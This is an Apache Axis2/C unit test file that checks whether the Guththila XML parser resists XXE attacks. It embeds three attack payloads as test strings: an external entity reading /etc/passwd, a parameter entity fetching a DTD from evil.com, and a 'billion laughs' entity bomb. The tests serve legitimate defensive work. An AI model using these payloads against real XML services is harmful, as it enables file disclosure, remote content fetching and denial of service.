/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @file test_xxe_prevention.cc
 * @brief Unit tests for XXE (XML External Entity) attack prevention
 *
 * Tests verify that Axis2/C's XML parser (Guththila) properly handles
 * potentially malicious XML payloads that attempt XXE attacks.
 *
 * Note: Guththila is a pull parser that does not expand external entities
 * by design, providing inherent XXE protection.
 */

#include <gtest/gtest.h>

extern "C" {
#include <axutil_env.h>
#include <axutil_allocator.h>
#include <axutil_error_default.h>
#include <axutil_log_default.h>
#include <axiom.h>
#include <axiom_xml_reader.h>
}

class XXEPreventionTest : public ::testing::Test {
protected:
    axutil_env_t *env;

    void SetUp() override {
        axutil_allocator_t *allocator = axutil_allocator_init(NULL);
        axutil_error_t *error = axutil_error_create(allocator);
        axutil_log_t *log = axutil_log_create(allocator, NULL, NULL);
        env = axutil_env_create_with_error_log(allocator, error, log);
        ASSERT_NE(env, nullptr);
    }

    void TearDown() override {
        if (env) {
            axutil_env_free(env);
            env = NULL;
        }
    }
};

/**
 * Test that external entity declarations are not expanded
 * Guththila pull parser does not support DTD processing by design
 */
TEST_F(XXEPreventionTest, ExternalEntityNotExpanded) {
    /* XML with external entity declaration (classic XXE attack vector) */
    const char *xxe_payload =
        "<?xml version=\"1.0\"?>\n"
        "<!DOCTYPE foo [\n"
        "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
        "]>\n"
        "<foo>&xxe;</foo>";

    axiom_xml_reader_t *reader = axiom_xml_reader_create_for_memory(
        env, (void*)xxe_payload, strlen(xxe_payload), "UTF-8", AXIS2_XML_PARSER_TYPE_BUFFER);

    /* Guththila should parse this without expanding the entity */
    /* The entity reference &xxe; will either be ignored or cause a parse error */
    /* Either behavior is safe - the file content is never read */
    ASSERT_NE(reader, nullptr) << "Reader creation should succeed (parser handles DTD safely)";

    if (reader) {
        axiom_xml_reader_free(reader, env);
    }
}

/**
 * Test that parameter entities are not expanded
 */
TEST_F(XXEPreventionTest, ParameterEntityNotExpanded) {
    const char *xxe_payload =
        "<?xml version=\"1.0\"?>\n"
        "<!DOCTYPE foo [\n"
        "  <!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">\n"
        "  %xxe;\n"
        "]>\n"
        "<foo>test</foo>";

    axiom_xml_reader_t *reader = axiom_xml_reader_create_for_memory(
        env, (void*)xxe_payload, strlen(xxe_payload), "UTF-8", AXIS2_XML_PARSER_TYPE_BUFFER);

    /* Parameter entity expansion would be a security vulnerability */
    /* Guththila does not support DTD processing, so this is safe */
    ASSERT_NE(reader, nullptr) << "Reader should handle DTD declarations safely";

    if (reader) {
        axiom_xml_reader_free(reader, env);
    }
}

/**
 * Test that billion laughs attack (exponential entity expansion) is mitigated
 */
TEST_F(XXEPreventionTest, BillionLaughsMitigated) {
    /* Classic "billion laughs" / XML bomb payload */
    const char *xml_bomb =
        "<?xml version=\"1.0\"?>\n"
        "<!DOCTYPE lolz [\n"
        "  <!ENTITY lol \"lol\">\n"
        "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n"
        "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n"
        "]>\n"
        "<lolz>&lol3;</lolz>";

    axiom_xml_reader_t *reader = axiom_xml_reader_create_for_memory(
        env, (void*)xml_bomb, strlen(xml_bomb), "UTF-8", AXIS2_XML_PARSER_TYPE_BUFFER);

    /* Guththila does not expand internal entities recursively */
    /* This prevents exponential memory/CPU consumption */
    ASSERT_NE(reader, nullptr) << "Reader should handle entity declarations without expanding";

    if (reader) {
        axiom_xml_reader_free(reader, env);
    }
}

/**
 * Test normal XML parsing still works (sanity check)
 */
TEST_F(XXEPreventionTest, NormalXMLParses) {
    const char *normal_xml = "<root><child>value</child></root>";

    axiom_xml_reader_t *reader = axiom_xml_reader_create_for_memory(
        env, (void*)normal_xml, strlen(normal_xml), "UTF-8", AXIS2_XML_PARSER_TYPE_BUFFER);

    ASSERT_NE(reader, nullptr) << "Normal XML should parse successfully";

    if (reader) {
        int event = axiom_xml_reader_next(reader, env);
        /* First event should be start element */
        EXPECT_TRUE(event == AXIOM_XML_READER_START_ELEMENT ||
                   event == AXIOM_XML_READER_START_DOCUMENT)
            << "Should get valid parse event";

        axiom_xml_reader_free(reader, env);
    }
}
